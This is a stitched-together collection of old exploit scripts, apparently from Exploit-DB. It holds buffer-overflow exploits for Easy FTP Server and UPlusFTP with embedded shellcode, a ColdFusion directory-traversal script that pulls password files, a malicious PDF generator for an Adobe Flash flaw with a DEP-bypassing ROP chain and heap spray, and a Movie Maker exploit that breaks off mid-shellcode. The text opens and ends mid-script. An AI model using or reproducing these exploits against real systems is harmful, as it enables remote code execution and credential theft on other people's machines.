"\xde\x6e\x3f\xf0\x32\x51\x7e\x3b\x47\x90\x47\x21\xa8\xc0\x10"
"\x2e\x1b\xf5\x15\x72\xa0\xf4\xf9\xf9\x98\x8e\x7c\x3d\x6c\x25"
"\x7e\x6d\xdd\x32\xc8\x95\x55\x1c\xe9\xa4\xba\x7e\xd5\xef\xb7"
"\xb5\xad\xee\x11\x84\x4e\xc1\x5d\x4b\x71\xee\x53\x95\xb5\xc8"
"\x8b\xe0\xcd\x2b\x31\xf3\x15\x56\xed\x76\x88\xf0\x66\x20\x68"
"\x01\xaa\xb7\xfb\x0d\x07\xb3\xa4\x11\x96\x10\xdf\x2d\x13\x97"
"\x30\xa4\x67\xbc\x94\xed\x3c\xdd\x8d\x4b\x92\xe2\xce\x33\x4b"
"\x47\x84\xd1\x98\xf1\xc7\xbf\x5f\x73\x72\x86\x60\x8b\x7d\xa8"
"\x08\xba\xf6\x27\x4e\x43\xdd\x0c\xa0\x09\x7c\x24\x29\xd4\x14"
"\x75\x34\xe7\xc2\xb9\x41\x64\xe7\x41\xb6\x74\x82\x44\xf2\x32"
"\x7e\x34\x6b\xd7\x80\xeb\x8c\xf2\xe2\x6a\x1f\x9e\xca\x09\xa7"
"\x05\x13")

eip = "\x91\xC8\x41\x7E" # CALL EDI - user32.dll
nopsled = "\x90" * 16

payload = "\x90" * (buffersize-(len(nopsled)+len(shellcode)))

def ExploitEasyFTP(target):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect = s.connect((target, 21))
	s.recv(1024)
	s.send('User anonymous\r\n')
	s.recv(1024)
	s.send('PASS anonymous\r\n')
	s.send('CWD '+nopsled+shellcode+payload+eip+'\r\n')
	s.recv(1024)
	s.send('QUIT ftp\r\n')
	s.close()

target = sys.argv[1]

ExploitEasyFTP(target)
#!/usr/bin/python
import socket,sys,base64

print """
#
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
	UPlusFTP Server v1.7.1.01 [ HTTP ] Remote BoF Exploit PoC
	Discovered by : Karn Ganeshen		   		   		   
	Author : Karn Ganeshen / corelanc0d3r
						   						   
	KarnGaneshen [aT] gmail [d0t] com 				   		   
	http://ipositivesecurity.blogspot.com
								   			   
	Greetz out to: 	corelanc0d3r
					http://corelan.be:8800/index.php
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
#
"""

# Tested on XP Pro SP2 [ Eng ] and XP Pro SP3 [ Eng ]
# Date Found : July 21, 2010
# Vendor notified on July 23, 2010
# Issue fixed and new version 1.7.1.02 released on July 23, 2010

if len(sys.argv) != 5:
    print "Usage: ./poc.py <Target IP> <Port> <User> <Password>"
    sys.exit(1)
 
target = sys.argv[1]
port = int(sys.argv[2])
user = sys.argv[3]
pwd = sys.argv[4]

auth = base64.b64encode(user+":"+pwd)

buf="A"*1963
buf+="\x90"*179

# 165 bytes Calc.exe shellcode / badchars identified and excluded
buf+=("\xd9\xca\x29\xc9\xb1\x24\xbf\x3f\xc7\x66\x9f\xd9\x74\x24\xf4\x5e"
"\x31\x7e\x17\x03\x7e\x17\x83\xf9\xc3\x84\x6a\xf9\x24\x0c\x95\x01"
"\xb5\x06\xd0\x3d\x3e\x64\xde\x45\x41\x7a\x6b\xfa\x59\x0f\x33\x24"
"\x5b\xe4\x85\xaf\x6f\x71\x14\x41\xbe\x45\x8e\x31\x45\x85\xc5\x4e"
"\x87\xcc\x2b\x51\xc5\x3a\xc7\x6a\x9d\x98\x2c\xf9\xf8\x6a\x73\x25"
"\x02\x86\xea\xae\x08\x13\x78\xef\x0c\xa2\x95\x84\x31\x2f\x68\x71"
"\xc0\x73\x4f\x81\x10\xba\x4f\xed\x1d\xfd\x7f\x68\xe1\x86\x73\xf9"
"\xa2\x7a\x07\x8d\x3e\x2e\x9c\x05\x37\xdb\xaa\x5e\xc7\xab\xad\x60"
"\xc8\x40\xc5\x5c\x97\x67\xe0\xfc\x71\x01\xf4\x7f\xbd\x6a\x55\x17"
"\xce\x07\x51\xb8\x46\x80\xa4\xcc\x99\xe7\xa7\x37\xc6\x66\x34\xd4"
"\x27\x0c\xbc\x7f\x38")

buf+="\x90"*15

#[ XP SP2 ] -> "\x78\x16\xF3\x77"	#0x77F31678  JMP ESP
buf+="\x78\x16\xF3\x77"

#[ XP SP3 ] -> "\x3F\x71\x49\x7E"   #0x7E49713F  JMP ESP
#buf+="\x3F\x71\x49\x7E"

buf+="\x90"*30
buf+="\x66\x05\x7A\x03"      	#ADD AX,037A
buf+="\x66\x05\x7A\x03"      	#ADD AX,037A
buf+="\x66\x05\x7A\x03"      	#ADD AX,037A
buf+="\x50\xc3"             	#PUSH EAX + RET

print "[+] Launching exploit against " + target + "..."

head = "GET /list.html?path="+buf+" HTTP/1.1 \r\n"
head += "Host: \r\n"
head += "Authorization: Basic "+auth+"\r\n"
 
try:
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect((target, port))
	s.send(head + "\r\n")
	print "[!] Payload sent..."
	s.close()
except:
	print "[x] Error!"
# Exploit Title: Easy FTP Server v1.7.0.11 NLST , NLST -al, APPE, RETR , SIZE  and XCWD Commands Remote Buffer Overflow Exploit
# Date: 10/8/2010
# Author: Rabih Mohsen
# Software Link:http://code.google.com/p/easyftpsvr/downloads/detail?name=easyftp-server-1.7.0.11-cn.zip
# Version: 1.7.0.11
# Tested on: Windows XP SP3 
# CVE:

import socket
import sys

buffersize = 272

# Buffer needed -> 272 bytes
# Metasploit Shellcode PoC - Calc.exe [ 228 bytes ] [ shikata_ga_nai - 1 iteration ] [ badchars \x00\x0a\x2f\x5c ]
 
shellcode = ("\xda\xc0\xd9\x74\x24\xf4\xbb\xe6\x9a\xc9\x6d\x5a\x33\xc9\xb1"
"\x33\x31\x5a\x18\x83\xea\xfc\x03\x5a\xf2\x78\x3c\x91\x12\xf5"
"\xbf\x6a\xe2\x66\x49\x8f\xd3\xb4\x2d\xdb\x41\x09\x25\x89\x69"
"\xe2\x6b\x3a\xfa\x86\xa3\x4d\x4b\x2c\x92\x60\x4c\x80\x1a\x2e"
"\x8e\x82\xe6\x2d\xc2\x64\xd6\xfd\x17\x64\x1f\xe3\xd7\x34\xc8"
"\x6f\x45\xa9\x7d\x2d\x55\xc8\x51\x39\xe5\xb2\xd4\xfe\x91\x08"
"\xd6\x2e\x09\x06\x90\xd6\x22\x40\x01\xe6\xe7\x92\x7d\xa1\x8c"
"\x61\xf5\x30\x44\xb8\xf6\x02\xa8\x17\xc9\xaa\x25\x69\x0d\x0c"
"\xd5\x1c\x65\x6e\x68\x27\xbe\x0c\xb6\xa2\x23\xb6\x3d\x14\x80"
"\x46\x92\xc3\x43\x44\x5f\x87\x0c\x49\x5e\x44\x27\x75\xeb\x6b"
"\xe8\xff\xaf\x4f\x2c\x5b\x74\xf1\x75\x01\xdb\x0e\x65\xed\x84"
"\xaa\xed\x1c\xd1\xcd\xaf\x4a\x24\x5f\xca\x32\x26\x5f\xd5\x14"
"\x4e\x6e\x5e\xfb\x09\x6f\xb5\xbf\xe5\x25\x94\x96\x6d\xe0\x4c"
"\xab\xf0\x13\xbb\xe8\x0c\x90\x4e\x91\xeb\x88\x3a\x94\xb0\x0e"
"\xd6\xe4\xa9\xfa\xd8\x5b\xca\x2e\xbb\x3a\x58\xb2\x12\xd8\xd8"
"\x51\x6b\x28")

eip = "\x91\xC8\x41\x7E" # CALL EDI - user32.dll
nopsled = "\x90" * 16

payload = "\x90" * (buffersize-(len(nopsled)+len(shellcode)))

# target, CMDS: anny of the "NLST , NLST -al, APPE, RETR , SIZE  and XCWD"
def GenericEasyFTPExploit(target, CMDS):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect = s.connect((target, 21))
	s.recv(1024)
	s.send('User anonymous\r\n')
	s.recv(1024)
	s.send('PASS anonymous\r\n')
	s.send(CMDS +" " + nopsled+shellcode+payload+eip+'\r\n')
	s.recv(1024)
	s.send('QUIT EASY ftp\r\n')
	s.close()

target = sys.argv[1]
CMDS  =  sys.argv[2]

GenericEasyFTPExploit(target,CMDS)
# Exploit Title: Easy FTP Server v1.7.0.11 Multiple Command Buffer Overflow
# Date: August 12, 2010
# Author: Glafkos Charalambous
# Software Link: http://easyftpsvr.googlecode.com/files/easyftp-server-1.7.0.11-en.zip
# Version: 1.7.0.11
# Tested on: Windows XP SP3 En
# Vulnerable Commands: DELE, STOR, RNFR, RMD, XRMD

import socket
import sys

if len(sys.argv) != 4:
    print "Usage: ./easyftp.py <Target IP> <Port> <Command>"
    print "Vulnerable Commands: DELE, STOR, RNFR, RMD, XRMD"
    sys.exit(1)
  
target = sys.argv[1]
port = int(sys.argv[2])
command = sys.argv[3]

buffersize = 268
 

# windows/exec - 227 bytes
# http://www.metasploit.com
# Encoder: x86/shikata_ga_nai
# EXITFUNC=process, CMD=calc.exe

shellcode = ("\xd9\xec\xba\x4c\x61\x82\xbc\xd9\x74\x24\xf4\x33\xc9\xb1\x33"
"\x58\x31\x50\x17\x83\xe8\xfc\x03\x1c\x72\x60\x49\x60\x9c\xed"
"\xb2\x98\x5d\x8e\x3b\x7d\x6c\x9c\x58\xf6\xdd\x10\x2a\x5a\xee"
"\xdb\x7e\x4e\x65\xa9\x56\x61\xce\x04\x81\x4c\xcf\xa8\x0d\x02"
"\x13\xaa\xf1\x58\x40\x0c\xcb\x93\x95\x4d\x0c\xc9\x56\x1f\xc5"
"\x86\xc5\xb0\x62\xda\xd5\xb1\xa4\x51\x65\xca\xc1\xa5\x12\x60"
"\xcb\xf5\x8b\xff\x83\xed\xa0\x58\x34\x0c\x64\xbb\x08\x47\x01"
"\x08\xfa\x56\xc3\x40\x03\x69\x2b\x0e\x3a\x46\xa6\x4e\x7a\x60"
"\x59\x25\x70\x93\xe4\x3e\x43\xee\x32\xca\x56\x48\xb0\x6c\xb3"
"\x69\x15\xea\x30\x65\xd2\x78\x1e\x69\xe5\xad\x14\x95\x6e\x50"
"\xfb\x1c\x34\x77\xdf\x45\xee\x16\x46\x23\x41\x26\x98\x8b\x3e"
"\x82\xd2\x39\x2a\xb4\xb8\x57\xad\x34\xc7\x1e\xad\x46\xc8\x30"
"\xc6\x77\x43\xdf\x91\x87\x86\xa4\x6e\xc2\x8b\x8c\xe6\x8b\x59"
"\x8d\x6a\x2c\xb4\xd1\x92\xaf\x3d\xa9\x60\xaf\x37\xac\x2d\x77"
"\xab\xdc\x3e\x12\xcb\x73\x3e\x37\xa8\x12\xac\xdb\x01\xb1\x54"
"\x79\x5e")

 
eip = "\x91\xC8\x41\x7E"
nopsled = "\x90" * 16
junk = "\x90" * (buffersize-(len(nopsled)+len(shellcode)))
payload = nopsled+shellcode+junk+eip

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    connect = s.connect((target, port))
    print "[+] Connected"
except:
    print "[!] Connection Failed"
    sys.exit(0)
s.recv(1024)
 	
s.send('User ftp\r\n')
s.recv(1024)
s.send('PASS ftp\r\n')
s.recv(1024)
print "[+] Sending payload..."
s.send(command +' '+payload+'\r\n')
s.close()
# Working GET request courtesy of carnal0wnage:
# http://server/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
#
# LLsecurity added another admin page filename: "/CFIDE/administrator/enter.cfm"


#!/usr/bin/python

# CVE-2010-2861 - Adobe ColdFusion Unspecified Directory Traversal Vulnerability
# detailed information about the exploitation of this vulnerability:
# http://www.gnucitizen.org/blog/coldfusion-directory-traversal-faq-cve-2010-2861/

# leo 13.08.2010

import sys
import socket
import re

# in case some directories are blocked
filenames = ("/CFIDE/wizards/common/_logintowizard.cfm", "/CFIDE/administrator/archives/index.cfm", "/cfide/install.cfm", "/CFIDE/administrator/entman/index.cfm", "/CFIDE/administrator/enter.cfm")

post = """POST %s HTTP/1.1
Host: %s
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: %d

locale=%%00%s%%00a"""

def main():
    if len(sys.argv) != 4:
        print "usage: %s <host> <port> <file_path>" % sys.argv[0]
        print "example: %s localhost 80 ../../../../../../../lib/password.properties" % sys.argv[0]
        print "if successful, the file will be printed"
        return
    
    host = sys.argv[1]
    port = sys.argv[2]
    path = sys.argv[3]

    for f in filenames:
        print "------------------------------"
        print "trying", f

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, int(port)))
        s.send(post % (f, host, len(path) + 14, path))

        buf = ""
        while 1:
            buf_s = s.recv(1024)
            if len(buf_s) == 0:
                break
            buf += buf_s
       
        m = re.search('<title>(.*)</title>', buf, re.S)
        if m != None:
            title = m.groups(0)[0]
            print "title from server in %s:" % f
            print "------------------------------"
            print m.groups(0)[0]
            print "------------------------------"

if __name__ == '__main__':
    main()'''
  __  __  ____         _    _ ____  
 |  \/  |/ __ \   /\  | |  | |  _ \ 
 | \  / | |  | | /  \ | |  | | |_) |
 | |\/| | |  | |/ /\ \| |  | |  _ <    Day 1 (Binary Analysis)
 | |  | | |__| / ____ \ |__| | |_) |
 |_|  |_|\____/_/    \_\____/|____/ 

http://www.exploit-db.com/adobe-acrobat-newclass-invalid-pointer-vulnerability/
https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/14853.tar.gz (moaub1-adobe-newclass.tar.gz)

  Title             : Adobe Acrobat Reader and Flash Player “newclass” invalid pointer vulnerability
  Analysis          : http://www.abysssec.com
  Vendor            : http://www.adobe.com
  Impact            : Ciritical
  Contact           : shahin [at] abysssec.com , info  [at] abysssec.com
  Twitter           : @abysssec
  CVE               : CVE-2010-1297
  MOAUB Number      : MOAUB-01-BA
'''

import sys

class PDF:
     
	def __init__(self):
		self.xrefs = []
		self.eol = '\x0a'
		self.content = ''
		self.xrefs_offset = 0
		
	def header(self):
		self.content += '%PDF-1.6' + self.eol
		
	def obj(self, obj_num, data,flag):
		self.xrefs.append(len(self.content))
		self.content += '%d 0 obj' % obj_num
		if flag == 1:
			self.content += self.eol + '<< ' + data + ' >>' + self.eol
		else:
			self.content += self.eol + data + self.eol
		self.content += 'endobj' + self.eol

	def obj_SWFStream(self, obj_num, data, stream):
		self.xrefs.append(len(self.content))
		self.content += '%d 0 obj' % obj_num
		self.content += self.eol + '<< ' + data + '/Params << /Size %d >> /DL %d /Length %d' %(len(stream),len(stream),len(stream))
		self.content += ' >>' + self.eol
		self.content += 'stream' + self.eol + stream + self.eol + 'endstream' + self.eol
		self.content += 'endobj' + self.eol
	
	def obj_Stream(self, obj_num, data, stream):
		self.xrefs.append(len(self.content))
		self.content += '%d 0 obj' % obj_num
		self.content += self.eol + '<< ' + data + '/Length %d' %len(stream)
		self.content += ' >>' + self.eol
		self.content += 'stream' + self.eol + stream + self.eol + 'endstream' + self.eol
		self.content += 'endobj' + self.eol
		
	def ref(self, ref_num):
		return '%d 0 R' % ref_num
		
	def xref(self):
		self.xrefs_offset = len(self.content)
		self.content += 'xref' + self.eol
		self.content += '0 %d' % (len(self.xrefs) + 1)
		self.content += self.eol
		self.content += '0000000000 65535 f' + self.eol
		for i in self.xrefs:
			self.content += '%010d 00000 n' % i
			self.content += self.eol
    
	def trailer(self):
		self.content += 'trailer' + self.eol
		self.content += '<< /Size %d' % (len(self.xrefs) + 1)
		self.content += ' /Root ' + self.ref(1) + ' >> ' + self.eol
		self.content += 'startxref' + self.eol
		self.content += '%d' % self.xrefs_offset
		self.content += self.eol
		self.content += '%%EOF'
		
	def generate(self):
		return self.content


		
		
class Exploit:
     
    def convert_to_utf16(self, payload):
        enc_payload = ''
        for i in range(0, len(payload), 2):
            num = 0
            for j in range(0, 2):
                num += (ord(payload[i + j]) & 0xff) << (j * 8)
            enc_payload += '%%u%04x' % num
        return enc_payload
             
    def get_payload(self):        	
        # shellcode calc.exe
        payload =("\x90\x90\x90\x89\xE5\xD9\xEE\xD9\x75\xF4\x5E\x56\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
	          "\x43\x43\x43\x43\x43\x43\x37\x51\x5A\x6A\x41\x58\x50\x30\x41\x30\x41\x6B\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41"
		  "\x42\x58\x50\x38\x41\x42\x75\x4A\x49\x4B\x4C\x4B\x58\x51\x54\x43\x30\x43\x30\x45\x50\x4C\x4B\x51\x55\x47\x4C\x4C\x4B\x43\x4C"
		  "\x43\x35\x44\x38\x45\x51\x4A\x4F\x4C\x4B\x50\x4F\x44\x58\x4C\x4B\x51\x4F\x47\x50\x45\x51\x4A\x4B\x51\x59\x4C\x4B\x46\x54\x4C"
		  "\x4B\x43\x31\x4A\x4E\x46\x51\x49\x50\x4A\x39\x4E\x4C\x4C\x44\x49\x50\x42\x54\x45\x57\x49\x51\x48\x4A\x44\x4D\x45\x51\x49\x52"
		  "\x4A\x4B\x4B\x44\x47\x4B\x46\x34\x46\x44\x45\x54\x43\x45\x4A\x45\x4C\x4B\x51\x4F\x47\x54\x43\x31\x4A\x4B\x43\x56\x4C\x4B\x44"
		  "\x4C\x50\x4B\x4C\x4B\x51\x4F\x45\x4C\x45\x51\x4A\x4B\x4C\x4B\x45\x4C\x4C\x4B\x43\x31\x4A\x4B\x4C\x49\x51\x4C\x47\x54\x45\x54"
		  "\x48\x43\x51\x4F\x46\x51\x4C\x36\x43\x50\x46\x36\x45\x34\x4C\x4B\x50\x46\x50\x30\x4C\x4B\x47\x30\x44\x4C\x4C\x4B\x44\x30\x45"
		  "\x4C\x4E\x4D\x4C\x4B\x42\x48\x44\x48\x4D\x59\x4B\x48\x4B\x33\x49\x50\x43\x5A\x46\x30\x45\x38\x4C\x30\x4C\x4A\x45\x54\x51\x4F"
		  "\x42\x48\x4D\x48\x4B\x4E\x4D\x5A\x44\x4E\x50\x57\x4B\x4F\x4A\x47\x43\x53\x47\x4A\x51\x4C\x50\x57\x51\x59\x50\x4E\x50\x44\x50"
		  "\x4F\x46\x37\x50\x53\x51\x4C\x43\x43\x42\x59\x44\x33\x43\x44\x43\x55\x42\x4D\x50\x33\x50\x32\x51\x4C\x42\x43\x45\x31\x42\x4C"
		  "\x42\x43\x46\x4E\x45\x35\x44\x38\x42\x45\x43\x30\x41\x41")
        return payload


    def getSWF(self):
        try:
            #swfFile = sys.argv[2]
            fdR = open('flash.swf', 'rb+')
            strTotal = fdR.read()
            str1 = strTotal[:88]
            addr1 = '\x06\xa6\x17\x30'    #  addr = 0c0c0c0c			
            str2 = strTotal[92:533]
			#***************************   Bypass DEP by VirtualProtect   ********************************
            rop = ''
            rop += "\x77\xFA\x44\x7E"     # mov edi,esp   ret 4
            rop += "\x94\x28\xc2\x77"	  #add esp,20  pop ebp  ret
            rop += "AAAA"				  #padding
            rop += "\xD4\x1A\x80\x7C"     # VirtualProtect
            rop += "BBBB"			      # Ret Addr for VirtualProtect
            rop += "CCCC"			      # Param1	(lpAddress)
            rop += "DDDD"			      # Param2	(Size)
            rop += "EEEE"			      # Param3	(flNewProtect)
            rop += "\x10\xB0\xEF\x77"     # Param4    (Writable Address)
            rop += "AAAAAAAAAAAA"		  #padding
            rop += "\xC2\x4D\xC3\x77"	  #mov eax,edi   pop esi  ret
            rop += "AAAA"				  #padding
            rop += "\xF2\xE1\x12\x06"	  #add eax,94   ret
            rop += "\x70\xDC\xEE\x77"     #push esp   pop ebp   ret4
            rop += "\x16\x9A\x94\x7C"	  #mov [ebp-30],eax  ret
            rop += "AAAA"				  #padding
            rop += "\xC2\x4D\xC3\x77"     #mov eax,edi   pop esi  ret
            rop += "AAAA"				  #padding
            rop += "\xF2\xE1\x12\x06"	  #add eax,94   ret
            rop += "\x79\x9E\x83\x7C"	  #mov [ebp-2c],eax  ret
            rop += "\x27\x56\xEA\x77"	  #mov eax,6b3  ret
            rop += "\x14\x83\xE0\x77"	  #mov [ebp-28],eax  ret
            rop += "\xB4\x01\xF2\x77"	  #xor eax,eax  ret
            rop += "\x88\x41\x97\x7C"	  #add eax,40  pop ebp  ret
            rop += "AAAA"				  #padding
            rop += "\x70\xDC\xEE\x77"	  #push esp   pop ebp   ret4
            rop += "\xC0\x9E\xEF\x77"	  #mov [ebp-54],eax  ret
            rop += "AAAA"				  #padding
            rop += "\xC2\x4D\xC3\x77"	  #mov eax,edi   pop esi  ret
            rop += "AAAA"				  #padding
            rop += "\xC1\xF2\xC1\x77"	  #add eax,8 ret
            rop += "\xCF\x97\xDE\x77"	  #xchg eax,esp   ret
			
            str3 = strTotal[669:1249]
            alignESP = "\x83\xc4\x03"
            sc = self.get_payload()
			
            if len(sc) > 2118:
                print "[*] Error : payload length is long"
                return
            if len(sc) <= 2118:
                dif = 2118 - len(sc)
            while dif > 0 :
                sc += '\x90'
                dif = dif - 1
			
            str4 = strTotal[3370:3726]
			
            addr2 = '\xF2\x3D\x8D\x23'    #  Enter 0C75 , 81    RET	
			
            str5 = strTotal[3730:]
			
            fdW= open('exploit.swf', 'wb+')
            finalStr = str1+addr1+str2+rop+str3+alignESP+sc+str4+addr2+str5
            fdW.write(finalStr)	
           		
            #strTotal = open('exploit.swf', 'rb+').read()
            fdW.close()
            fdR.close()
            return finalStr
            
        except IOError:
            print '[*] Error : An IO error has occurred'
		
    def HeapSpray(self):
        spray = '''	
        function spray_heap()
        {
            var chunk_size, payload, nopsled;
             
            chunk_size = 0x1A0000;
            pointers = unescape("%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030");
            pointerSled = unescape("<Contents>");
            while (pointerSled.length < chunk_size)
                pointerSled += pointerSled;
            pointerSled_len = chunk_size - (pointers.length + 20);       
            pointerSled = pointerSled.substring(0, pointerSled_len);
            heap_chunks = new Array();
            for (var i = 0 ; i < <CHUNKS> ; i++)
                heap_chunks[i] = pointerSled + pointers;
        }            
        
         
        spray_heap();   
        '''
		
        spray = spray.replace('<Contents>', '%u33dd%u3030')   # Pointer to XCHG ESP , EBX
        '''
Authplay.dll
		
303033DD             ? 87DC                 XCHG ESP,EBX

#############################################################
					 will do nothing	

303033DF             ? 45                   INC EBP
303033E0             ? 05 00898784          ADD EAX,84878900 
303033E5             ? 42                   INC EDX
303033E6             ? 05 008987E8          ADD EAX,E8878900
303033EB             ? 41                   INC ECX
303033EC             ? 05 008987EC          ADD EAX,EC878900
303033F1             ? 41                   INC ECX
303033F2             ? 05 008987F0          ADD EAX,F0878900
303033F7             ? 41                   INC ECX
303033F8             ? 05 008987F4          ADD EAX,F4878900
303033FD             ? 41                   INC ECX
303033FE             ? 05 005F5E5D          ADD EAX,5D5E5F00
30303403             . B8 01000000          MOV EAX,1
30303408             . 5B                   POP EBX
############################################################

30303409             . 83C4 30              ADD ESP,30
3030340C             . C3                   RETN

        '''

        spray = spray.replace('<CHUNKS>', '40')   #Chunk count
        return spray
		
def generate_pdf():
	exploit = Exploit()
	swfFile = 'exploit.swf'
	pdf = PDF()
	pdf.header()
	pdf.obj(1, '/MarkInfo<</Marked true>>/Type /Catalog/Pages ' + pdf.ref(2) + ' /OpenAction ' + pdf.ref(17),1)
	#pdf.obj(1, '/MarkInfo<</Marked true>>/Type /Catalog/Pages ' + pdf.ref(2) ,1)
	pdf.obj(2, '/Count 1/Type/Pages/Kids[ '+pdf.ref(3)+' ]',1)
	pdf.obj(3, '/Annots [ '+pdf.ref(5) +' ]/Parent '+pdf.ref(2) + " /Type/Page"+' /Contents '+pdf.ref(4) ,1)
	pdf.obj_Stream(4, '','')
	pdf.obj(5, '/RichMediaSettings '+pdf.ref(6)+' /NM ( ' + swfFile + ' ) /Subtype /RichMedia /Type /Annot /RichMediaContent '+pdf.ref(7)+' /Rect [ 266 116 430 204 ]',1)
	pdf.obj(6, '/Subtype /Flash /Activation '+pdf.ref(8)+' /Type /RichMediaSettings /Deactivation '+pdf.ref(9),1)  
	pdf.obj(7, '/Type /RichMediaContent /Assets '+pdf.ref(10) +' /Configurations [ ' + pdf.ref(11) + ']',1)
	pdf.obj(8, '/Type /RichMediaActivation /Condition /PO ',1)	
	pdf.obj(9, '/Type /RichMediaDeactivation /Condition /XD ',1)	
	pdf.obj(10, '/Names [('+ swfFile +') ' + pdf.ref(12)+' ]',1)	
	pdf.obj(11, '/Subtype /Flash /Type /RichMediaConfiguration /Name (ElFlash) /Instances [ '+pdf.ref(13) +' ]',1)	
	pdf.obj(12, '/EF <</F '+pdf.ref(14) +' >> /Type /Filespec /F ('+ swfFile +')',1)	
	pdf.obj(13, '/Subype /Flash /Params '+pdf.ref(15) +' /Type /RichMediaInstance /Asset '+ pdf.ref(12) ,1)
	pdf.obj_SWFStream(14, ' /Type /EmbeddedFile  ',exploit.getSWF() )  
	pdf.obj(15, '/Binding /Background /Type /RichMediaParams /FlashVars () /Settings '+pdf.ref(16),1)
	pdf.obj_Stream(16, '<</Length 0 >> ','')  
	pdf.obj(17, '/Type /Action /S /JavaScript /JS (%s)' % exploit.HeapSpray(),1) 
	
	pdf.xref()
	pdf.trailer()
	return pdf.generate()
	
def main():
	if len(sys.argv) != 2:
		print 'Usage: python %s [output file name]' % sys.argv[0]
		sys.exit(0)
	file_name = sys.argv[1]
	if not file_name.endswith('.pdf'):
		file_name = file_name + '.pdf'
	try:
		fd = open(file_name, 'wb+')
		fd.write(generate_pdf())
		fd.close()
		print '[-] PDF file generated and written to %s' % file_name
	except IOError:
		print '[*] Error : An IO error has occurred'
		print '[-] Exiting ...'
		sys.exit(-1)
if __name__ == '__main__':
	main()
'''
 __  __  ____         _    _ ____  
 |  \/  |/ __ \   /\  | |  | |  _ \ 
 | \  / | |  | | /  \ | |  | | |_) |
 | |\/| | |  | |/ /\ \| |  | |  _ <  Day 4 
 | |  | | |__| / ____ \ |__| | |_) |
 |_|  |_|\____/_/    \_\____/|____/ 

  http://www.exploit-db.com/movie-maker-remote-code-execution-ms10-016/
  https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/14886.zip (Movie-Maker-Remote-Code-Execution-Exploit.zip)

  Title               : Movie Maker Remote Code Execution  (MS10-016)
  Version             : moviemk.exe 2.1 (XP SP3)
  Analysis            : http://www.abysssec.com
  Vendor              : http://www.microsoft.com
  Impact              : Ciritical
  Contact             : shahin [at] abysssec.com , info  [at] abysssec.com
  Twitter             : @abysssec
  CVE                 : CVE-2010-0265

  
'''


# Exploit for CVE-2010-0265
# Tested on Windows XP SP3( Movie Maker 2.1 )
  


import sys

def main():
   
    try:
		fdR = open('src.mswmm', 'rb+')
		strTotal = fdR.read()
		str1 = strTotal[:9976]
		str2 = strTotal[9980:10104]
		str3 = strTotal[10108:16496]
		str4 = strTotal[17620:]
		
		size_first_new = "\x20\x00\x00\x00"      # size of first new()
		size_second_new = "\x11\x11\x00\x00" 	# size of second new()
		
		p2p = "\x71\xb5\x06\x77"    #   vtable fake pointer from resource section COMRes -8 to jmp EBX 
		
		# shellcode calc.exe
		shellcode = '\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xeb\x00\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x49\x49\x49\x49\x49\x49\x49\x49\x48\x49\x49\x49\x49\x49\x49\x49\x49\x49\x51\x5a\x6a\x44\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x54\x42\x32\x41\x42\x32\x42\x41\x30\x42\x41\x58\x41\x50\x38\x41\x42\x75\x4a\x49\x69\x6c\x4b\x58\x51\x54\x65\x50\x57\x70\x45\x50\x4e\x6b\x67\x35\x35\x6c\x4e\x6b\x73\x4c\x55\x55\x71\x68\x67\x71\x68\x6f\x6c\x4b\x52\x6f\x46\x78\x4e\x6b\x51\x4f\x71\x30\x74\x41\x7a\x4b\x30\x49\x6c\x4b\x54\x74\x6e\x6b\x76\x61\x4a\x4e\x35\x61\x4b\x70\x6a\x39\x4c\x6c\x4d\x54\x6b\x70\x30\x74\x54\x47\x6a